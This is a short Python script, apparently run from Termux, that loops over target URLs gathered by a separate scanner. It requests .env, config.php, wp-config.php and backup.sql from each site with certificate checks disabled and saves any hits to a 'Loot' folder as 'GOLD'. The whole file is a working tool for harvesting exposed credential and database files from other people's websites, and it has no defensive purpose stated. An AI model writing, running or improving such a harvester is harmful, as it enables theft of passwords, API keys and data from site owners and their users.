import asyncio, httpx, os

VAULT_FILE = "/data/data/com.termux/files/home/Titan-Lab/Data_Vault/targets.txt"
LOOT_PATH = "/data/data/com.termux/files/home/Titan-Lab/Data_Vault/Loot/"

async def harvest(client, url):
    # قائمة الملفات الحساسة (الذهب)
    targets = [".env", "config.php", "wp-config.php", "backup.sql"]
    for item in targets:
        try:
            target_url = f"{url.rstrip('/')}/{item}"
            r = await client.get(target_url, timeout=5)
            if r.status_code == 200 and len(r.text) > 50:
                if not os.path.exists(LOOT_PATH): os.makedirs(LOOT_PATH)
                filename = url.replace("https://", "").replace("http://", "").replace("/", "_") + f"_{item}"
                with open(LOOT_PATH + filename, "w") as f:
                    f.write(r.text)
                print(f"💰 GOLD FOUND: Saved {item} from {url}")
        except: pass

async def main():
    print("💎 Harvester Online: Collecting Loot...")
    async with httpx.AsyncClient(verify=False) as client:
        while True:
            if os.path.exists(VAULT_FILE):
                with open(VAULT_FILE, "r") as f:
                    # العمل على آخر أهداف لقاها جيش النمل
                    links = f.readlines()[-30:]
                await asyncio.gather(*[harvest(client, l.strip()) for l in links if "http" in l])
            await asyncio.sleep(20)

if __name__ == "__main__": asyncio.run(main())
